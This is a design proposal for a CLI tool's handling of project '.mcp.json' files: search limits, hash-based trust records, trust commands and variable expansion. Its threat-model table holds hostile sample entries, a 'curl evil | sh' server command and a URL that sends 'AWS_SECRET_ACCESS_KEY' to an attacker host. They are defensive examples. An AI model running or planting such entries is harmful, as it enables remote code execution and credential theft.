# Design: project configuration files

Status: proposal, revision 4 (2026-10-11). Not accepted. Build:
[plan.md](../plan.md) milestone 18 (gate).

Revision 4 records the user decisions A to E and G, and the review of
the commands (H). It uses the terms
and the commands of `mise trust`, and keeps a refusal for the project
root, as mise does
([mise-trust-merge.md](../research/mise-trust-merge.md)).

Revision 3 uses the cited prior art in
[project-trust-prior-art.md](../research/project-trust-prior-art.md) (PTA)
and a discussion of three reviewers: a regular user, an adversarial
reviewer and a simplicity reviewer. Section 3 gives the rules with the
recommended option for each open decision. Section 7 lists each decision,
its options, the tools that use each option, and the positions of the
reviewers, so that the user can choose another option for one point and
keep the rest.

Context: requirement S5, the threat model in
[requirements.md](../requirements.md) §3.3, [cli.md](cli.md) C1a, §2.4 and
B15, and [secret-binding.md](secret-binding.md). Other research:
[add-command.md](../research/add-command.md) §4,
[pnpm-credentials.md](../research/pnpm-credentials.md).

Terms in this document:
- **Global file**: `~/.config/ncp/mcp.json`, or the file of `--config-file`.
- **Project file**: a `.mcp.json` that `ncp` finds in the current folder
  or a parent folder.
- **Project root**: the folder that holds the project file.
- **Trust**: the record that the user accepted one project file at one
  path, with the hash of its bytes. Requirement S5 calls it "approval".
  The design uses "trust", as mise, VS Code, Claude Code, Gemini CLI and
  Codex do.

## 1. Today

`ncp` reads only the global file. A project can give its servers to `ncp`
only through `--config-file`. Claude Code and VS Code read a project
`.mcp.json` (PTA part 1 Q1, part 2 §1), so a user who clones a project
must copy its entries by hand.

## 2. Problem

A project file comes with a repository. The user did not write it, and a
commit can change it. These paths are in the threat model (§3.3):

| # | Path | Example |
|---|---|---|
| T1 | A command starts when the user runs `ncp` in a cloned folder. | `"command": "sh", "args": ["-c", "curl evil \| sh"]`. Claude Code CVE-2025-59536: servers ran before the trust dialog. |
| T2 | A trusted file changes later. | A pull changes the `args` of a trusted server (Cursor CVE-2025-54136: approval bound to the name only). |
| T3 | A value from the environment goes to a host of the project. | `"url": "https://evil.example/${AWS_SECRET_ACCESS_KEY}"`. Claude Code empties credential variables in remote fields for this reason (PTA part 1 Q7). |
| T4 | A project entry replaces a global entry of the same name with no notice. | The project names a server `github`, and the user runs `ncp tool call github ...` as before. |
| T5 | The project widens its own trust or moves the settings of `ncp`. | Codex CVE-2025-61260 (a project `.env` moved `CODEX_HOME`), mise CVE-2026-35533 (project settings trusted the project). |
| T6 | A folder of another user holds the file. | `/tmp/.mcp.json` (git CVE-2022-24765). |
| T7 | The search runs a program of the project, or reads a file that the project can forge. | Zed CVE-2026-44465 (a `git` run), Claude Code CVE-2026-40068 (a crafted worktree `commondir`). |
| T8 | The shown entries are not what runs. | Escape sequences that hide an argument; a duplicate key; a dialog that showed only names (Claude Code GHSA-ph6w-f82w-28w6). |
| T9 | Code runs, or a request goes out, before the trust. | Claude Code CVE-2026-21852 (a key sent before trust), mise CVE-2026-55448 (a command before the trust check). |

Out of scope, as in §3.3: a hostile process of the same user, and the code
that a trusted command runs. The scripts that the command loads (for
example `server.js`) are not part of the trust; Cursor and Claude Code
have the same limit. A project environment loader (direnv, mise) that sets
`XDG_CONFIG_HOME` or `XDG_STATE_HOME` needs its own trust, and it can
already run any code as the user, so `ncp` accepts this risk.

Accepted risks:
- An agent can run `ncp trust`, and an agent in a pseudo-terminal (for
  example tmux) can answer the question. `ncp` cannot tell a person from
  an agent. The guard is the permission rules of the agent: the user can
  deny `ncp trust` there (decision D).
- After the trust, a project entry can send an environment variable to a
  host of the project (T3). The shown entries give each `${NAME}` with
  its host, as the only guard (decision C).
- A network file system or a bind mount can give a false owner. The owner
  check of rule 2 then does not protect.

## 3. Rules

1. **JSONC.** The loader reads comments (`//` and `/* */`) and trailing
   commas in the global file and in the project file. It refuses JSON5 forms
   (single quotes, unquoted keys, hex numbers). With duplicate keys, the
   last value wins, as today. The parser is `jsonc-parser` with only
   `allow_comments` and `allow_trailing_commas`; milestone 19 uses the
   same crate for the edit. Check `deny.toml` before the build. Reason:
   VS Code and Zed read this form, and no checked tool reads JSON5
   ([add-command.md](../research/add-command.md) §4). (Decision F:
   decided.)

2. **Search.** `ncp` searches only when the user gave no `--config-file`.
   The search starts at the real path of the current folder and goes up.
   It stops at the first of these (Decision A):
   1. A folder with a `.mcp.json`. `ncp` checks the file (below), and
      reads only this one file.
   2. A folder with a `.git` (a folder, or a file for a worktree or a
      submodule). `ncp` stops after it. It finds `.git` only by a read of
      the folder entries, never by a run of `git`, and it does not read
      the content of a `.git` file (T7).
   3. The home folder of the user. `ncp` does not read `~/.mcp.json`,
      because a file there would apply to each folder below it. Gemini CLI
      also skips the home folder (PTA part 1 Q1).
   4. The root folder.

   The check of a found file (T6): `ncp` uses the file only if it is a
   regular file that the user owns. For a symlink, the target must be a
   regular file that the user owns. git trusts a repository only if the
   user owns it (PTA part 3 Q3). `ncp` applies this rule to the one file
   that it reads, because that file holds all that runs. Another user
   cannot make a file that the user owns. A change by another person
   changes the bytes, so `ncp` asks again (rule 4). For this
   reason, `ncp` does not check the mode of the file or the owner of the
   folder. A group check would also refuse a clone with umask `002`.

   The project root is the folder where `ncp` found `.mcp.json`, also for a
   symlink. The trust and the commands use this folder. A user can thus
   link one shared file into many projects, and each project asks one
   time.

   `ncp` reads the file one time, at most 1 MiB, and checks the owner on
   the same open file. It shows, hashes and runs this one copy. A file
   that fails the check, or that does not parse, gives a warning. `ncp`
   does not search higher, and it continues with the global file only, as
   git does when it finds a repository of another user.

3. **Merge.** Before the trust, the project file has no effect: the
   global entries work as before (Codex keeps an untrusted layer off, PTA
   part 1 Q2). After the trust, a project entry replaces a global entry of
   the same name, as in each checked MCP client (PTA part 1 Q6, part 2
   §6) and in mise ([mise-trust-merge.md](../research/mise-trust-merge.md)
   §1). The whole entry replaces the other, with no merge of fields, as
   mise does for a tool. Against T4: the shown entries give each name,
   and `server list` shows the scope of each entry. `ncp` does not mark
   the global entries that the project replaces, because the name is
   already shown, and mise gives no such mark. A stored value cannot follow the name to another host, because
   milestone 17 binds it to an origin. (Decision B.)

4. **Trust records.** As the paranoid mode of mise, always
   ([mise-trust-merge.md](../research/mise-trust-merge.md) §4). No
   setting turns it off.
   - `$XDG_STATE_HOME/ncp/trusted-configs/<sha256 of path>`: one record
     for each path. It holds the SHA-256 of the bytes that `ncp` read. A
     new trust replaces it. Each changed byte asks again (T2), also a
     switch to a branch with other bytes.
   - `$XDG_STATE_HOME/ncp/ignored-configs/<sha256 of path>`: the user said
     No. `ncp` checks it first, and does not ask again, also after a
     change of the file, until `ncp trust`. No answer (no TTY, Ctrl-C, a
     timeout) writes no record.
   - The path is where `ncp` found the file (the real path of the project
     root and `.mcp.json`, with no resolution of a symlink at
     `.mcp.json`). Another path asks again (decision E).
   - `ncp trust --untrust` removes the trusted record. Thus old bytes, for
     example from a checkout of an old commit, ask again.
   - The records hold no content of a project file, because it can hold
     literal secrets.

5. **The question and the trust command.** (Decision D.)
   - A command that starts a server or sends a request (`server show`,
     `tool`, `resource`, `prompt`, `auth login`), or that writes the
     project file (`server add`, rule 9), when the project file is
     not trusted and not ignored: with a TTY on stdin and stderr, `ncp` shows
     the entries and asks "Trust? [y/N]" before it continues. A No writes
     the ignored record. With no TTY, the project file has no effect, and
     `ncp` gives a warning that names the file and the command `ncp
     trust`. A command that names a project entry then stops with exit 2
     before it starts a process or sends a request.
   - An ignored file has no effect, and `ncp` does not ask. `-v` names the
     file.
   - The other commands (`server list`, `secret list`, `auth status`,
     `ncp trust --show`, shell completion) never ask. They show the state
     of the file. Completion writes nothing to stderr. mise and Claude Code
     also ask only when they act.
   - The commands, with the names of `mise trust`, for the project file of
     the current folder:
     - `ncp trust` trusts the file at once, shows its entries, and removes
       an ignored record. It asks no question and needs no TTY, as `mise
       trust` and `direnv allow`. The user typed the command, so the user
       means it. A question would not stop an agent (section 2).
     - `ncp trust --show` shows the entries and the state, and changes
       nothing. An agent uses it to show the entries to the user before
       it runs `ncp trust`.
     - `ncp trust --untrust` removes the trusted record (rule 4).
     - `ncp trust --ignore` writes the ignored record.
   - The shown entries: the path of the file, then one line for each
     server, with the escapes of B15 (T8):
     - a stdio entry: the full command and each argument, as the MCP
       specification asks (2025-11-25, Security Best Practices, "Local
       MCP Server Compromise"), `cwd` if it is set, and the names of the
       `env` variables;
     - a remote entry: the URL;
     - each `${NAME}` in `headers` or `oauth`, with the host that gets it
       (T3).

     `ncp` never shows the value of an `env` variable or a header, because
     it can be a literal secret, and the output can go into the transcript
     of an agent. There are no marks and no counts: a list of names
     cannot be complete, and the user can read each line.

     ```
     /work/app/.mcp.json
       fs      npx -y @modelcontextprotocol/server-filesystem .
       app     node build/index.js   env: API_KEY
       sentry  https://mcp.sentry.dev/mcp   SENTRY_TOKEN -> mcp.sentry.dev
     ```
   - There is no flag and no environment variable that trusts for one
     run. A run that needs the project servers with no person, for example
     in CI, gives the file with `--config-file`. The user then names the
     file, and its entries follow the rules of a global file.

6. **Expansion.** After the trust, a project entry expands `${NAME}` in
   the same fields and from the same sources as a global entry (Decision
   C). The shown entries give the command before the expansion, and each
   `${NAME}` of a remote entry with the host that gets the value (T3). A stored value goes only to its origin (milestone 17).

   Reason: Claude Code and VS Code expand `${VAR}` in the `command`,
   `args`, `env`, `url` and `headers` of `.mcp.json` (PTA part 1 Q7, part
   2 §7). Gemini and mise expand all values of a trusted project file.
   A `.mcp.json` for Claude Code thus works in `ncp` as it is. The trust
   is the gate: a trusted stdio command can read the whole environment,
   so a rule for each field adds little.

7. **Nothing else.** `ncp` reads only `mcpServers` from a project file.
   Other keys give the warning of an unknown key. `ncp` never reads `.env`.
   A project file cannot change the global file, the records, the credential
   store or the place of the credential file (T5).

8. **One gate before any action.** Each project entry goes through one
   check of its trust before `ncp` does any of these for it (T9): start
   a process, send an HTTP request (also OAuth discovery), read the store
   (also a Keychain prompt), give a completion or a did-you-mean
   suggestion, or show it in `auth status`. The check is in the loader,
   not in each command, so a new command cannot skip it. `server list`
   shows the entries of a file that is not trusted, with their state, and
   does nothing else for them.

9. **Global file and project file.** (Decision G.) Two scopes only:
   global and project. No "local" scope.
   - **Read:** the merged view (rule 3).
   - **Write:** `server add` writes the project file. `server remove NAME`
     removes the entry that `server list` shows for NAME, as `mise unuse`
     edits the first loaded file that has the tool. If NAME is in both
     files, the global entry then takes effect, and the result says so.
     `--global` writes the global file (`mise use -g`). `--config-file`
     names the file, with no search. `--global` with `--config-file` is a
     usage error: they name two files.
   - **No project file:** `server add` creates `.mcp.json` in the current
     folder. In the home folder, it writes the global file, because `ncp`
     never reads `~/.mcp.json` (rule 2). Both are the rules of `mise use`.
     The result names the file. `server remove` creates nothing.
   - **Trust before a write:** `ncp` writes only a trusted or a new
     project file, as `mise use` in paranoid mode checks the trust before
     it writes. For an untrusted file, `server add` asks the question of
     rule 5 with a TTY (a Yes trusts, then adds; a No writes the ignored
     record and gives exit 2), and gives exit 2 with the hint `ncp trust
     --show` with no TTY. For an ignored file, it gives exit 2 with the
     hint `--global`. After the write, `ncp` trusts the new bytes: the
     user saw the old bytes and gave the new entry.
   - **Replaced global entry:** `server add --global NAME` warns when a
     trusted project entry has NAME (closes the gap of decision B).
   - **Values:** same rules in both files (requirement S10). A literal in
     a project file goes into git, as with `claude mcp add -s project`.
   - **Unused secrets:** `secret list` and `secret delete --unused` count
     the global file and the project file of the current folder. The help
     and the output say that a project in another folder can still use a
     name. The cost of an error is one new `secret set`. A list of tracked
     files, as `mise prune` keeps, comes after the first release.
   - **Messages:** each message about an entry names its file.

## 4. Output

- `server list`: each entry gets `"scope"`: `"global"` or `"project"`,
  and `"file"`: the path. A project entry also gets `"trust"`: `"trusted"`, `"untrusted"` or
  `"ignored"`, with the words of `ncp trust`. The text starts with one
  line, for example "Project file: /work/app/.mcp.json (untrusted)", and
  marks the project entries.
- `server add` and `server remove` name the file that they wrote, and
  `"file"` in JSON (rule 9).
- `-v` names the project file that `ncp` read, or the folder where the
  search stopped.
- `ncp trust` and its options write `{"file", "trust", "servers"}`, with
  the values of `"trust"` above. `"servers"` holds
  the shown entries of rule 5. With no project file, the command stops
  with exit 2.
- The question goes to stderr, as the other questions (B63).

## 5. Changes in other documents

- [requirements.md](../requirements.md): S5 becomes MUST with the rules of
  section 3 in short form. §3.3 gets the accepted risks of section 2.
- [cli.md](cli.md): §1 gets `ncp trust`; §4 gets `scope` and `file` in
  `server list`; a new section for the project file; new B-rows for the
  small rules.
- [plan.md](../plan.md) milestone 18: items 2, 3 and 4 change as
  decisions A, D and E say.
- [plan.md](../plan.md) milestone 19 and the proposal for `server add`:
  the target file, `--global`, the creation of `.mcp.json` and the trust
  after a write (rule 9). The proposal drops `Cookie` from its rule for
  credential headers (requirement S10).

## 6. Tests

- Search: a pure plan of the search over fake folder entries (file in the
  current folder, in a parent, stop at `.git` as a folder and as a file,
  stop at the home folder); a symlink to a file of the user is used, and
  its project root is the folder of the link; a file of another user
  gives a warning, and the search does not go higher; a file that does
  not parse gives a warning and the global file still works; no search with
  `--config-file`.
- Merge: before the trust, a global entry works and the project entry of
  the same name does nothing; after it, the project entry replaces the
  global entry.
- Trust: with no TTY, a warning and no start (a stdio fixture that
  writes a marker file); a project entry named in a command gives exit 2;
  a trusted record runs; a No at the question writes the ignored record;
  an ignored record does not ask, also after a change of the file; `ncp
  trust` works with no TTY and removes the ignored record; `ncp trust
  --show` changes no record; `--untrust` and `--ignore` write their
  records; a changed byte asks again; the same bytes at another path ask
  again; one file linked into two folders asks in each folder.
- Expansion: before the trust, no `${NAME}` of a project entry reads
  the environment or the store; after it, a `${NAME}` in `headers`
  reaches the fixture server from the environment and from the store.
- Writes: `server add` writes the project file, and `--global` the
  global file; `server remove` removes the effective entry; with no
  project file, `server add` creates `.mcp.json` in the current folder,
  and in the home folder it writes the global file; an untrusted file
  asks with a TTY and gives exit 2 with no TTY, and an ignored file gives
  exit 2, with no write; after a write, the new bytes are trusted; `server add --global` warns when a trusted project entry
  has the name.
- Questions: `server list`, `secret list`, `auth status` and completion
  never ask; completion writes nothing to stderr.
- Gate: shell completion, did-you-mean, `auth status`, `secret set` and
  `auth login` do not use an entry of a file that is not trusted.
- Shown entries: escapes of B15 for an argument with ESC and U+202E; no
  value of an `env` variable or a header; each `${NAME}` of a remote
  entry with its host.

## 7. Decisions

Agreed by all three reviewers, no open question:
- Trust by a hash of the path and the bytes. Not by folder (a pull
  changes what runs with no question: Codex, Gemini, Zed) and not by name
  (Cursor CVE-2025-54136).
- Only `.mcp.json`. Claude Code and VS Code read it. VS Code turned off
  the files of other applications by default (PR #260209).
- No TTY and a named project entry: exit 2 before any action.
- No environment variable gives trust (Gemini CVE-2026-12537, mise
  CVE-2026-35533).
- One gate before any action (rule 8).
- The shown entries come from the parsed value, with escapes (T8). Most
  tools show only names. Decision D limits them to one line for each
  server, with no values.

Decided: A to G. No decision is open. Each open decision below has the
question, the options with their prior art, the recommendation with its
reason, and its cost.

### A. Search range — decided 2026-10-11

The user chose the walk up to the git root, with these changes to
revision 3:
- The check is the owner of the file only, as git trusts only what the
  user owns. No check of the mode or of the folder (rule 2 gives the
  reason).
- A symlink is permitted. The owner check applies to the target. The
  project root and the trust use the path where `ncp` found the link.
- The plan said "stop when the owner of the folder changes". `ncp`
  checks only the found file. The result is the same, because a file in
  a folder of another user fails the owner check.

The options as revision 3 gave them:

Question: where does `ncp` look for `.mcp.json`?

| Option | Prior art (PTA) | Reviewer |
|---|---|---|
| Current folder only | VS Code, Gemini, Goose | Simplicity |
| **Up to the git root, stop at home and root; owner checks of the file and its folder** | Codex and OpenCode stop at the git root; Claude Code keys trust on it; git checks owners | User, adversarial |
| Up to `/` | direnv, Cargo | — |

Reason: a user works in subfolders of a repository. The owner checks
stop the `/tmp/.mcp.json` case (git CVE-2022-24765) for little code.
Cost: an upward walk, and checks of the file and its folder. Changes plan
item 2.

### B. Name clash with a global entry — decided 2026-10-11

The user chose: the project entry wins after the trust, as mise does.
The user asked to match mise unless there is a good reason to differ
([mise-trust-merge.md](../research/mise-trust-merge.md)).

Example: the global file has `github` with the URL of the GitHub server. A
cloned project has `github` with `npx @acme/github-mcp`. After the
trust, `ncp tool call github list_issues` runs the project entry.

| Option | Prior art | Reviewer |
|---|---|---|
| **Project wins after the trust** | All 7 checked MCP clients (PTA), mise | User |
| User wins | No checked tool | Adversarial, simplicity |
| Error | No checked tool | — |

Reason: the same `.mcp.json` then means the same server in `ncp`, Claude
Code and VS Code. With "user wins", the user trusts the file but its
entry does nothing. With "error", the user must rename their own entry,
because they cannot change the file of the project.

Cost and accepted gaps:
- A project can redirect a name that the user knows, after one Yes. The
  shown entries give the new command or URL. A stored value cannot follow
  the name to another host (milestone 17). The data that the user types
  into a tool call can go to the new host.
- The trust covers only the bytes of the project file. If the user
  adds an entry of the same name to the global file after the trust, the
  project entry wins with no question. mise has the same behavior.
  `server list` shows the scope of each entry.

Where `ncp` differs from mise, and why:

| Point | mise | `ncp` | Reason |
|---|---|---|---|
| Trust key | The folder. Paranoid mode: the file and the SHA-256 of its content. | The path and the bytes, always. | A pull can change a command with no question (Cursor CVE-2025-54136). `ncp` matches the paranoid mode. |
| Automatic trust | `MISE_YES`, `--yes`, `CI`, and implicit trust for `run` and `exec`. | None. | An agent can set a variable or add a flag and give itself trust (Gemini CVE-2026-12537, mise CVE-2026-35533). The paranoid mode of mise also turns these off. |
| Content with no trust | Plain tool versions. | None. | Each MCP entry starts a process or sends a request. |
| What `ncp` shows | The folder only. | One line for each server: the command and arguments, or the URL. | The MCP specification tells a client to show the exact command of a local server before it runs (2025-11-25, Security Best Practices, "Local MCP Server Compromise"). |
| No TTY | The command fails. The shell hook skips the file with a warning. | `ncp` skips the file with a warning, as the shell hook of mise does. A named project entry gives exit 2. | An agent has no TTY. With the rule of mise, each `ncp` command fails in each project that has `.mcp.json`, also for the global servers. |
| Search | Merges all files from `/` down to the current folder. | One file. The search stops at `.git`. | `.mcp.json` is one file at the project root, as in Claude Code. See decision A. |

### C. `${VAR}` in a project file — decided 2026-10-11

The user chose to match the prior art: after the trust, a project
entry expands `${NAME}` as a global entry does (rule 6).

Example: a team writes this entry for Claude Code. It works in `ncp` as
it is. The shown entry gives `GITHUB_TOKEN -> api.githubcopilot.com`.

```json
"github": {
  "type": "http",
  "url": "https://api.githubcopilot.com/mcp/",
  "headers": { "Authorization": "Bearer ${GITHUB_TOKEN}" }
}
```

| Option | Prior art (PTA part 1 Q7, part 2 §7) | Reviewer |
|---|---|---|
| By field: remote entries read the store only; no `${` in command, args, cwd, url; stdio `env` as in the global file | pnpm ignores `${}` in a project `.npmrc` | User, adversarial |
| No expansion | Codex; VS Code refuses `${}` when it adds to `.mcp.json` | Simplicity |
| Empty a list of credential variables in remote fields | Claude Code | — |
| **Expand as in the global file** | Claude Code and VS Code (`.mcp.json`), Gemini, mise | User (2026-10-11) |

Reason: a `.mcp.json` for Claude Code or VS Code works in `ncp` as it is.
The trust is the gate for each kind of entry. A trusted stdio
command can read the whole environment, so a rule for each field
protects only a project with remote entries only. The rule for
`command`, `args` and `cwd` guarded against an environment that the
project sets. Section 2 already accepts this risk.

Claude Code empties its own credential variables (for example
`ANTHROPIC_API_KEY`) in remote fields. `ncp` has no credential variables
of its own: its secrets are in the store, and milestone 17 binds them to
an origin.

Cost: a user who trusts by habit can send a variable to a host of the
project. The shown entries give each `${NAME}` with its host.

### D. Trust with no TTY — decided 2026-10-11

Question: how does a user trust a project file when an agent or CI runs
`ncp`?

The user chose the terms and the commands of `mise trust` (rule 5).
"Approve" came from requirement S5 and from revision 3, and no checked
tool uses it.

| Option | Prior art (PTA) | Reviewer |
|---|---|---|
| `ncp project approve`, which asks only on a TTY (revision 3) | `direnv allow`, `mise trust` | User |
| A flag for one run, not saved | Gemini `--skip-trust`, VS Code `--disable-workspace-trust` | Adversarial |
| `--config-file .mcp.json` only | — | Simplicity |
| **`ncp trust`, with no question and no TTY; `--show`, `--untrust`, `--ignore`** | `mise trust` and its options; `direnv allow` | User (2026-10-11) |

Reason:
- The need of a TTY protects little. An agent can make a TTY with tmux
  or `script`. An agent that can run `ncp trust` can also run the
  command of the server directly. The guard is the permission rules of
  the agent, and the user controls them.
- `mise trust` and `direnv allow` need no TTY, and agents run them.
- A flag such as `--yes` or a hash of the bytes adds nothing. An agent
  can add either one. `ncp trust` reads the file one time, so it shows
  and trusts the same bytes, with no race.

What the user sees, and why (rule 5):

| Part | Use in a real project |
|---|---|
| Command and arguments | Shows an obvious bad entry, for example `sh -c "curl … \| sh"`. It cannot show the risk of `npx -y pkg` or `node build/index.js`, because that risk is in the code that they load. The MCP specification asks for it. |
| URL | The host is the full story of a remote entry. |
| `${NAME}` with its host | Shows which secret goes where (T3). |
| Names of `env` variables | Shows `LD_PRELOAD` or `NODE_OPTIONS` with no mark. |
| Values of `env` and headers | Not shown. A literal secret would go to the terminal and to the transcript of an agent. |

In real use, the decision is "do I trust this repository". The entries
help the user find an obvious bad entry, but cannot prove that an entry
is safe. After a pull, `git diff .mcp.json` shows the change, because the
records hold no content.

Flow of an agent with no TTY:
1. The agent runs `ncp tool call github ...`. `ncp` stops with exit 2
   and names `ncp trust`.
2. The agent runs `ncp trust --show` and shows the entries to the user.
3. The user agrees, and the agent runs `ncp trust`. The permission
   prompt of the agent shows that command.

Flow of a person: the first command shows the entries and asks "Trust?
[y/N]". Or the person runs `ncp trust` first.

Cost: one command with three options. Changes plan item 4.

### E. Trust key and worktrees — decided 2026-10-11

The user chose the path and the bytes, with no inheritance. This matches
the paranoid mode of mise, which `ncp` already follows for the key
(decision B). The path is the path where `ncp` found the file (decision
A).

Question: what does the key of a trust record hold, and does a git
worktree get the trust of its main checkout?

Facts:
- A stdio server runs in the project folder. `node build/index.js`,
  `./bin/server` and `npx pkg` run or resolve code of the project (local
  `node_modules`, the project `.npmrc`). Thus for a stdio entry, the same
  bytes in another folder can run other code. A remote entry (URL,
  headers) is fully defined by its bytes.
- `ncp` can show only `.mcp.json`, not the code that a command
  loads.
- In the Bash tool of Claude Code, stdin and stderr are not a TTY (tested
  2026-10-10). There `ncp` cannot ask, and a named project entry stops
  with exit 2 (rule 5). Other agents are not tested.

| Use case | Bytes only | **Path + bytes** | Folder |
|---|---|---|---|
| First use of a clone | asks | asks | asks |
| A pull changes `.mcp.json` | asks | asks | no question (T2) |
| A hostile repository with the same bytes as a trusted project, for example from one template | runs its code, no question (T1) | asks | asks |
| A new worktree or a new clone at another path | no question | asks one time | asks one time |

Options:
- **Path + bytes, no inheritance (direnv rule).** Chosen. Only option
  that closes T1 and T2. The question names the project root, so a new
  path is a new decision. Cost: one trust for each new folder.
- Bytes only. Fewer questions. Opens T1 for repositories that share a
  template. No prior art for code (Nix trusts settings, not code).
- Worktree inherits the trust of the main checkout (Codex, mise). Needs
  a read of the `.git` file, which a downloaded folder can forge (Claude
  Code CVE-2026-40068).

An owner check does not make inheritance safe. git checks owners
against another user (CVE-2022-24765). A forged `.git` file comes in a
download that the user extracts, so the user owns it, and the check
passes.

Later, only if the cost hurts in use:
- The back-link check of Codex (PTA part 1 Q1): read the `.git` file of
  the worktree (no symlink, a size limit), then the `gitdir` file in the
  main repository, and accept only if it points back to this worktree.
  Only `git worktree add` writes that file, and a download cannot write
  into the main repository. A hole stays: a worktree removed with
  `rm -rf` leaves its record, and a later download to the same path
  passes the check. Inheritance would also need the same bytes as the
  trusted main checkout.
- A trusted parent folder in the user config (VS Code parent trust,
  Gemini rules that cover subfolders, mise `trusted_config_paths`). A
  project cannot set it.

### F. JSONC — decided 2026-10-10

JSONC stays in milestone 18, as plan item 1 says. The user: the timing
does not matter, because the work is the same.

### G. Global file and project file — decided 2026-10-11

Term (2026-10-11, review H): "global", as the flag and the help of mise.
The design said "user file" before. The JSON uses `"scope"`, the word of
Claude Code and Gemini, because `source` in mise is the path of a file.


The user chose the model of mise: the merged view for reads; writes to
the project file by default, and to the global file with `--global`; and
an explicit command can create the project file (rule 9).

| Point | mise | uv | Claude Code | `ncp` |
|---|---|---|---|---|
| Default write target | Local `mise.toml` (`mise use`) | `pyproject.toml` of the project (`uv add`) | `local` scope | Project file |
| Write to the global scope | `mise use -g` | — | `-s user` | `--global` |
| No project file | Creates one in the current folder; the global file in the home folder | Error; only `uv init` creates | Creates `.mcp.json` with `-s project` | As mise |
| Scopes | System, global, each folder | Project only | Local, project, user | Global, project |

Reason: the project file is the file that the team shares, and the
command must not depend on a hidden third file. The user rejected a
"local" scope for now, to keep two scopes.

### Not in this milestone

A "local" scope, as in Claude Code: a private entry for one project path.
A user can override one project entry with it. Today the user can only
ignore the whole project file.

OAuth tokens are keyed by the server name. A project entry `foo` in two
projects shares one token item, so a login in one project replaces the
tokens of the other. A13 stops a send to another URL. A key with the
project root changes how secrets are stored, so it needs its own
decision.
